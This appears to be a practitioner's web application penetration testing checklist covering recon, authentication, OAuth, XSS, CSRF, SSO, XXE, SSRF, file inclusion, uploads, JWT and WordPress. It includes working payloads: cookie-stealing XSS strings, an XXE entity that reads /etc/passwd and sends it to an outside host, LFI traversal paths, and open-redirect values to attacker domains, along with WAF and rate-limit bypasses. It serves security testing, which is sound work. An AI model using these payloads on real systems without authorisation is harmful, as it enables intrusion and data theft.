# Penetration Testing Checklist

**Prepared by: Md Rifat (D4RKR@1)**

---

- **Pre-engagement** **&** **Recon Phase**
    - Open Source Reconnaissance
        - [ ]  Google Dorking
        - [ ]  Perform OSINT
    - Information Gathering
        - [ ]  Find the version details of the Web Server, domains, IP addresses, technologies and database
        - [ ]  Use `curl` for web server name and version of any website: `curl -I [http://example.com](http://example.com/)`
        - [ ]  Use tools like ``theHarvester``, ``Sublist3r``, and ``Amass`` to identify subdomains.
        - [ ]  Perform `WHOIS lookup` to gather domain ownership information.
        - [ ]  **Waybackmachine - Web info check** https://archive.org/web/
        - [ ]  **Web tools:** [`https://bdia.btcl.com.bd/`,](https://bdia.btcl.com.bd/) [`https://research.domaintools.com/`,](https://research.domaintools.com/) [`https://archive.org/web/`](https://archive.org/web/), [`https://www.iplocation.net/`](https://www.iplocation.net/)
    - Looking For Metafiles
        - [ ]  Use **`[MetaFinder](https://github.com/Josue87/MetaFinder)`**
        - [ ]  View the Robots.txt file
        - [ ]  View the Sitemap.xml file
        - [ ]  View the Humans.txt file
        - [ ]  View the Security.txt file
        - [ ]  JS Files Analysis
    - Enumerating Web Server’s Applications
        - [ ]  Directory & IP Range Enumeration with `Nmap`, `Netcat`
        - [ ]  Perform a DNS lookup & Reverse DNS lookup
        - [ ]  Subdomain Enumeration and Bruteforcing
        - [ ]  Subdomain Takeover
        - [ ]  Admin panel fuzzing with `[ffuf](https://github.com/ffuf/ffuf)` : `ffuf -w /path/to/wordlist -u https://target/FUZZ`
        - [ ]  Get Parameter: `ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242`
        - [ ]  Port Scanning `nmap`
        - [ ]  Template-Based Scanning(`Nuclei`)
        - [ ]  Wayback History = `waybackurls`
        - [ ]  Broken Link Hijacking
        - [ ]  Internet Search Engine Discovery
        - [ ]  Misconfigured Cloud Storage
    - Review The Web Contents
        - [ ]  Inspect the page source for sensitive info
        - [ ]  Try to find Sensitive Javascript codes
    - Test For Server Side Includes
        - [ ]  Use Google dorks to find the SSI
        - [ ]  Construct RCE on top of SSI
        - [ ]  Construct other injections on top of SSI
        - [ ]  Test Injecting SSI on login pages, header fields, referrer, etc
    - Fingerprint Web Application Framework
        - [ ]  Use the `Wappalyzer` browser extension
        - [ ]  Use `Whatweb`
        - [ ]  View URL extensions
        - [ ]  View HTML source code ctrl+u
        - [ ]  View the cookie parameter
        - [ ]  View the HTTP headers
    - Use **[`EmailFinder`](https://github.com/Josue87/EmailFinder) (To find company emails)**
        
        ```markup
        Example: 
        emailfinder -d domain.com
        ```
        
    - Use `Dirsearch` (**Web path discovery**)
        
        ```markup
        Example: python3 dirsearch.py -u https://target
        ```
        
    - Mapping Execution Paths
        - [ ]  Use `Burp Suite`
        - [ ]  Use `Dirsearch`
        - [ ]  Use `Gobuster`
        - [ ]  Identify all accessible URLs, parameters, forms, and functionalities.
        - [ ]  Map the overall site structure
- **Vulnerability Assessment 1st Phase**
    - [ ]  **Automated** **Vulnerability Scanning** with: `Acunetix`, `Nessus`, `Nexpose`, `Sn1per` or `OpenVAS`.
    - [ ]  **Registration Feature Testing like** duplicate registration/Overwrite existing user, weak password,
    - [ ]  Use `hakrawler` (web crawler for gathering URLs and JavaScript file locations)
    - [ ]  Use `gospider` (crawling site)
    - [ ]  Use `Katana` (web crawling)
    - [ ]  Use `nmap`** (Network exploration, host discovery, Port scan)
    - [ ]  Use `reconftw`** (Website vulnerability scan all-in-one)
    - [ ]  Use `Johntheripper` (P**assword cracking**)
    - **Session Management Testing**
        - [ ]  Identify actual session cookie out of bulk cookies in the application
        - [ ]  Ensure the cookie cant be forced over an unencrypted channel.
        - [ ]  Check for session cookies and cookie expiration date/time
        - [ ]  Identify cookie domain scope
        - [ ]  Check for HttpOnly flag in cookie
        - [ ]  Check for Secure flag in cookie if the application is over SSL
        - [ ]  Check for session fixation, value of session cookie before and after authentication
        - [ ]  Failure to Invalidate Session on (Email Change,2FA Activation)
        - [ ]  Replay the session cookie from a different effective IP address or system - to check whether the server maintains the state of the machine or not
        - [ ]  Check for session after closing the browser.
        - [ ]  Check for concurrent login through different machine/IP
        - [ ]  Decode cookies using some standard decoding algorithms such as `Base64`, `hex`, `URL`
    - **Authentication Testing**
        - [ ]  Username enumeration
        - [ ]  Test for weak credentials using tools like `Hydra` or `Medusa`
        - [ ]  Bypass authentication using various SQL Injections on username and password field
        - Lack of password confirmation on
            - [ ]  Change email address
            - [ ]  Change password
            - [ ]  Manage 2FA
        - [ ]  Check if user credentials are transmitted over SSL or not
        - [ ]  Weak login function HTTP and HTTPS both are available
        - Test user account lockout mechanism on brute force attack
            
            Variation : If server blocks instant user requests, then try with time throttle option from intruder and repeat the process again.
            
            - [ ]  Bypass rate limiting by tampering user agent to Mobile User agent
            - [ ]  Bypass rate limiting by tampering user agent to Anonymous user agent
            - [ ]  Bypass rate liniting by using null byte
        - [ ]  Create a password wordlist using `cewl`command
        - Test Oauth login functionality
            - OAuth Roles
                - [ ]  Resource Owner → User
                - [ ]  Resource Server → Twitter
                - [ ]  Client Application → [Twitterdeck.com](http://twitterdeck.com/)
                - [ ]  Authorization Server → Twitter
                - [ ]  client_id → Twitterdeck ID (This is a public, non-secret unique identifier_
                - [ ]  client_secret → Secret Token known to the Twitter and Twitterdeck to generate access_tokens
                - [ ]  response_type → Defines the token type e.g (code, token, etc.)
                - [ ]  scope → The requested level of access Twitterdeck wants
                - [ ]  redirect_uri → The URL user is redirected to after the authorization is complete
                - [ ]  state → Main CSRF protection in OAuth can persist data between the user being directed to the authorization server and back again
                - [ ]  grant_type → Defines the grant_type and the returned token type
                - [ ]  code → The authorization code twitter generated, will be like ?code= , the code is used with client_id and client_secret to fetch an access_token
                - [ ]  access_token → The token twitterdeck uses to make API requests on behalf of the user
                - [ ]  refresh_token → Allows an application to obtain a new access_token without prompting the user
            - Code Flaws
                - [ ]  Re-Using the code
                - [ ]  Code Predict/Bruteforce and Rate-limit
                - [ ]  Is the code for application X valid for application Y?
            - Redirect_uri Flaws
                - [ ]  URL isn't validated at all: ?redirect_uri=https://attacker.com
                - [ ]  Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): ?redirect_uri=https://sub.twitterdeck.com
                - [ ]  Host is validated, path isn't Chain open redirect): ?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com
                - [ ]  Host is validated, path isn't (Referer leakages): Include external content on HTML page and leak code via Referer
                - [ ]  Weak Regexes
                - [ ]  Bruteforcing the URL encoded chars after host: redirect_uri=https://twitterdeck.com§FUZZ§
                - [ ]  Bruteforcing the keywords whitelist after host (or on any whitelist open redirect filter): ?redirect_uri=https://§FUZZ§.com
                - [ ]  URI validation in place: use typical open redirect payloads
            - State Flaws
                - [ ]  Missing State parameter? (CSRF)
                - [ ]  Predictable State parameter?
                - [ ]  Is State parameter being verified?
            - Misc
                - [ ]  Is client_secret validated?
                - [ ]  Pre ATO using facebook phone-number signup
                - [ ]  No email validation Pre ATO
        - Test 2FA Misconfiguration
            - [ ]  Response Manipulation
            - [ ]  Status Code
            - [ ]  Manipulation
            - [ ]  2FA Code Leakage in Response
            - [ ]  2FA Code Reusability
            - [ ]  Lack of Brute-Force Protection
            - [ ]  Missing 2FA Code Integrity Validation
            - [ ]  With null or 000000
    - **Account (Post Login) Testing**
        - [ ]  Find parameter which uses active account user id. Try to tamper it in order to change the details of the other accounts
        - [ ]  Post login change email id and update with any existing email id. Email confirmation link check. What if a user does not confirm the link in some time frame?
        - [ ]  Open profile picture in a new tab and check the URL. Find email id/user id info.
        - [ ]  Check account deletion option if application provides it and confirm that via forgot password feature
        - [ ]  Change email id, account id, user id parameter and try to brute force other user's password
        - [ ]  Check whether application re authenticates for performing sensitive operation for post authentication features
    - **Forgot Password Testing**
        - [ ]  Failure to invalidate session on Logout and Password reset
        - [ ]  Check if forget password reset link/code uniqueness
        - [ ]  Check if reset link does get expire or not if its not used by the user for certain amount of time
        - [ ]  Find user account identification parameter and tamper Id or parameter value to change other user's password
        - [ ]  Check for weak password policy
        - [ ]  Does it display old password on the same page after forget password?
        - [ ]  Check if active session gets destroyed upon changing the password or not?
    - **Product Purchase Testing**
        - [ ]  Tamper product ID to purchase other high valued product with low prize
        - [ ]  Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts amd money to be used
        - [ ]  same voucher twice by adding same parameter name and value again with & in the BurpSuite request
        - [ ]  Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to
        place order for that particular item
    - **Open Redirection Testing**
        - [ ]  Use burp 'find' option in order to find parameters such as URL, red, redirect, redir, origin, redirect_uri, target etc
        - [ ]  Check the value of parameter which may contain a URL
        - [ ]  Change the URL value to [www](http://www.chintan.com/) and check if gets redirected or not
        - [ ]  Using a whitelisted domain or keyword
        - [ ]  Using // to bypass http blacklisted keyword
        - [ ]  Using https: to bypass // blacklisted keyword
        - [ ]  Using \\ to bypass // blacklisted keyword
        - [ ]  Using \/\/ to bypass // blacklisted keyword
        - [ ]  Using null byte %00 to bypass blacklist filter
        - [ ]  Using ° symbol to bypass
- **Vulnerability Assessment 2nd Phase**
    - **Host Header Injection**
        - [ ]  Supply an arbitrary Host header
        - [ ]  Check for flawed validation
        - Send ambiguous requests
            - [ ]  Inject duplicate Host headers
            - [ ]  Supply an absolute URL
            - [ ]  Add line wrapping
        - [ ]  Inject host override headers
    - **SQL Injection**
        - [ ]  Use Burp Suite for ****Brute-force attacks****
        - [ ]  Use `SQLmap` to identify vulnerability parameters
        - [ ]  Run SQL injection scanner on all requests
        - [ ]  SQL WAF using `cyberfox`
        - Bypassing WAF
            - [ ]  Using Null byte before SQL query
            - [ ]  Using SQL inline comment sequence
            - [ ]  URL encoding
            - [ ]  Changing Cases (uppercase/lowercase)
            - [ ]  Use SQLMAP tamper scripts
    - **Cross-Site Scripting (XSS)**
        - [ ]  Try XSS using QuickXSS tool by theinfosecguy
        - [ ]  ctrl+u= view-source: link
        - [ ]  Upload file using '"><img src=x onerror=alert(document.domain)>.txt
        - [ ]  If script tags are banned, use <h1> and other HTML tags
        - [ ]  If output is reflected back inside the JavaScript as a value of any variable just use alert(1)
        - [ ]  if " are filtered then use this payload /><img src=d onerror=confirm(/tushar/);>
        - [ ]  Upload a JavaScript using Image file
        - [ ]  Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes
        - Tag attribute value
            - [ ]  Input landed -<input type=”text” name=”state” value=”INPUT_FROM_ USER”>
            - [ ]  Payload to be inserted -“ onfocus=”alert(document.cookie)"
        - [ ]  Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e"
        - XSS filter evasion
            - [ ]  < and > can be replace with html entities &lt; and &gt;
            - [ ]  You can try an XSS polyglot.Eg:-javascript:/*-></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
        - XSS Firewall Bypass
            - [ ]  Check if the firewall is blocking only lowercase
            - [ ]  Try to break firewall regex with the new line(\r\n)
            - [ ]  Try Double Encoding
            - [ ]  Testing for recursive filters
            - [ ]  Injecting anchor tag without whitespaces
            - [ ]  Try to bypass whitespaces using Bullet
            - [ ]  Try to change request method
        - [ ]  Try Dom based XSS
    - **CSRF Vulnerabilities**
        - Application has Anti-CSRF token implemented
            - [ ]  Removing the Anti-CSRF Token
            - [ ]  Altering the Anti-CSRF Token
            - [ ]  Using the Attacker’s Anti-CSRF Token
            - [ ]  Spoofing the Anti-CSRF Token
            - [ ]  Using guessable Anti-CSRF Tokens
            - [ ]  Stealing Anti-CSRF Tokens
        - Application uses Double Submit Cookie
            - [ ]  Check for session fixation on subdomains
            - [ ]  Man in the the middle attack
        - Application validates the Referrer or the Origin of the request received
            - [ ]  Restricting the CSRF POC from sending the Referrer header
            - [ ]  Bypass the whitelisting/blacklisting mechanism used by the application
        - [ ]  Change Email Change Password -Change account details (Name, Number, Address, etc.)
        - Sending data in JSON/XML format
            - [ ]  By using normal HTML Form1
            - [ ]  By using normal HTML Form2 (By Fetch Request)
            - [ ]  By using XMLHTTP Request/AJAX request
            - [ ]  By using Flash file
        - SameSite Cookie attribute
            - [ ]  SameSite Lax bypass via method override
            - [ ]  SameSite Strict bypass via client-side redirect
            - [ ]  SameSite Strict bypass via sibling domain
            - [ ]  SameSite Lax bypass via cookie refresh
    - **SSO Vulnerabilities**
        - [ ]  If company.com Redirects You To SSO e.g. x.company.com, Do FUZZ
        On company.com
        - [ ]  If company.com/internal Redirects You To SSO e.g. Google login, Try To Insert
        public Before internal e.g. company.com/public/internal To Gain Access Internal
        - [ ]  Try To Craft SAML Request With Token And Send It To The Server And Figure
        Out How Server Interact With This
        - [ ]  If There Is AssertionConsumerServiceURL In Token Request Try To Do FUZZ
        On Value Of AssertionConsumerServiceURL If It Is Not Similar To Origin
        - [ ]  If There Is Any UUID, Try To Change It To UUID Of Victim Attacker e.g. Email Of
        Internal Employee Or Admin Account etc
        - [ ]  Try To Figure Out If The Server Vulnerable To XML Signature Wrapping OR Not?
        - [ ]  Try To Figure Out If The Server Checks The Identity Of The Signer OR Not?
        - [ ]  Try To Inject XXE Payloads At The Top Of The SAML Response
        - [ ]  Try To Inject XSLT Payloads Into The Transforms Element As A Child
        Node Of The SAML Response
        - [ ]  If Victim Can Accept Tokens Issued By The Same Identity Provider That Services
        Attacker, So You Can Takeover Victim Account
        - [ ]  While Testing SSO Try To search In Burp Suite About URLs In Cookie Header e.g.
        Host=IP; If There Is Try To Change IP To Your IP To Get SSRF
    - **XML Injection**
        - [ ]  Change the content type to text/xml then insert below code. Check via repeater
        
        ```markup
        <?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo (#ANY)>
        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
        <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
        ```
        
        - [ ]  Blind XXE with out-of-band interaction
    - **Cross-origin resource sharing (CORS)**
        - [ ]  Errors parsing Origin headers
        - [ ]  Whitelisted null origin value
    - **Server-side request forgery (SSRF)**
        - [ ]  Try basic localhost payloads
        - Bypassing filters
            - [ ]  Bypass using HTTPS
            - [ ]  Bypass with [::]
            - [ ]  Bypass with a domain redirection
            - [ ]  Bypass using a decimal IP location
            - [ ]  Bypass using IPv6/IPv4 Address Embedding
            - [ ]  Bypass using malformed urls
            - [ ]  Bypass using rare address(short-hand IP addresses by dropping the zeros)
            - [ ]  Bypass using enclosed alphanumerics
        - Cloud Instances
            - [ ]  AWS
            - [ ]  Google Cloud
            - [ ]  Digital Ocean
            - [ ]  Azure
        - [ ]  Bypassing via open redirection
    - **Local File Inclusion (LFI)**
        - [ ]  Use `ffuf` tools
        - [ ]  Try to change the local path
        - [ ]  Apply https://www.example.com/index.php?page=../../../../../../../../../../../../etc/passwd
        - [ ]  **Domain root = we can upload file**
        - [ ]  Use the LFI payload list
        - [ ]  Test LFI by adding a null byte at the end
    - LFI To R**emote Code Execution (**RCE)
        - [ ]  Use burp Suit
        - [ ]  Proxy-HTTP history-send to **repeater**
        - [ ]  change page=**/etc/passwd** , find “**root/bin/bash**” in response if not find send to **intruder**
        - [ ]  use LFI RCE payload for sniper attack and send request to repeater
        - [ ]  change ‘’**etc/passwd’’ to  ‘’proc%2fself%2fenviron’’**
        - [ ]  For more follow: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
    - **Test For Remote File Inclusion (RFI)**
        - [ ]  Look for RFI keywords
        - [ ]  Try to change the remote path
        - [ ]  Use the RFI payload list
    - **File Upload & Download Testing**
        - Shell Upload
            - [ ]  upload the malicious file `malware.php.jpg` to the archive upload functionality and observe how the application responds
        - [ ]  upload a file and change its path to overwrite an existing system file
        - [ ]  Large File Denial of Service
        - Data Security Testing
            - [ ]  Test for sensitive data exposure in the application's responses.
            - [ ]  Ensure proper encryption and protection of sensitive data in transit and at rest.
        - [ ]  Metadata Leakage
        - [ ]  ImageMagick Library Attacks
        - [ ]  Pixel Flood Attack
        - [ ]  Test for path traversal and arbitrary file download vulnerabilities
        - Bypasses
            - [ ]  Null Byte (%00) Bypass
            - [ ]  Content-Type Bypass
            - [ ]  Magic Byte Bypass
            - [ ]  Client-Side Validation Bypass
            - [ ]  Blacklisted Extension Bypass
            - [ ]  Homographic Character Bypass
    - Security Misconfigurations
        - [ ]  Identify and assess security misconfigurations such as open directories, exposed sensitive information, and default settings.
        - [ ]  Check for unnecessary services and ports that could lead to potential attacks.
        - [ ]  Example: Access directories like `/backup` to look for sensitive files.
    - **CAPTCHA Testing**
        - [ ]  Missing Captcha Field Integrity Checks
        - [ ]  HTTP Verb Manipulation
        - [ ]  Content Type Conversion
        - [ ]  Reusuable Captcha
        - [ ]  Check for the server side validation for CAPTCHA.
        - [ ]  Remove captcha block from GUI using firebug addon and submit request to the server
        - [ ]  Check if image recognition can be done with OCR tool?
    - API Security Testing
        - [ ]  If applicable, test the security of APIs using tools like `Postman`, `Swagger`, or `Burp Suite`
        - [ ]  Check for vulnerabilities like insecure API endpoints, broken authentication, and authorization issues.
    - **JWT Token Testing**
        - [ ]  Brute-forcing secret keys
        - [ ]  Signing a new token with the “none” algorithm
        - [ ]  Changing the signing algorithm of the token (for fuzzing purposes)
        - [ ]  Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)
    - **WebSockets Testing**
        - [ ]  Intercepting and modifying WebSocket messages
        - [ ]  Websockets MITM attempts
        - [ ]  Testing secret header websocket
        - [ ]  Content stealing in websockets
        - [ ]  Token authentication testing in websockets
    - **GraphQL Vulnerabilities Testing**
        - [ ]  Inconsistent Authorization Checks
        - [ ]  Missing Validation of Custom Scalars
        - [ ]  Failure to Appropriately Rate-limit
        - [ ]  Introspection Query Enabled/Disabled
    - **Denial of Service**
        - [ ]  Cookie bomb
        - [ ]  Pixel flood, using image with a huge pixels
        - [ ]  Frame flood, using GIF with a huge frame
        - [ ]  ReDoS (Regex DoS)
        - [ ]  CPDoS (Cache Poisoned Denial of Service)
    - WordPress Security
        - [ ]  Use `wpscan` (WordPress Security Scanner)
        - **WordPress Common Vulnerabilities**
            - [ ]  XSPA in wordpress
            - [ ]  Bruteforce in wp-login.php
            - [ ]  Information disclosure wordpress username
            - [ ]  Backup file wp-config exposed
            - [ ]  Log files exposed
            - [ ]  Denial of Service via load-styles.php
            - [ ]  Denial of Service via load-scripts.php
            - [ ]  DDOS using xmlrpc.php
            - [ ]  Hash password crack: `hashcat`
        - WP-Exploit
            
            ```markup
            Find exploit
            https://www.exploit-db.com/google-hacking-database
            Save ssf.py
            Open cmd
            Run: python3 ssf.py link
            ```
            
        - [ ]  Use `Waybackurls` (find admin-wp-content links)
    - **Other Test Cases**
        - Testing for Role authorization
            - [ ]  Check if normal user can access the resources of high privileged users?
            - [ ]  Forced browsing
            - [ ]  Insecure direct object reference
            - [ ]  Parameter tampering to switch user account to high privileged user
        - Check for security headers and at least
            - [ ]  X Frame Options
            - [ ]  X-XSS header
            - [ ]  HSTS header
            - [ ]  CSP header
            - [ ]  Referrer Policy
            - [ ]  Cache Control
            - [ ]  Public key pins
        - Blind OS command injection
            - [ ]  using time delays
            - [ ]  by redirecting output
            - [ ]  with out-of-band interaction
            - [ ]  with out-of-band data exfiltration
        - [ ]  Command injection on CSV export (Upload/Download)
        - [ ]  Blacklist check https://mxtoolbox.com/blacklists.aspx
        - [ ]  CSV Excel Macro Injection
        - [ ]  If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability.
        - [ ]  Parameter Pollution Social Media Sharing Buttons
        - Broken Cryptography
            - [ ]  Cryptography Implementation Flaw
            - [ ]  Encrypted Information Compromised
            - [ ]  Weak Ciphers Used for Encryption
        - Web Services Testing
            - [ ]  Test for directory traversal
            - [ ]  Web services documentation disclosure Enumeration of services, data types, input types boundaries and limits
- **Reporting & Documentation**
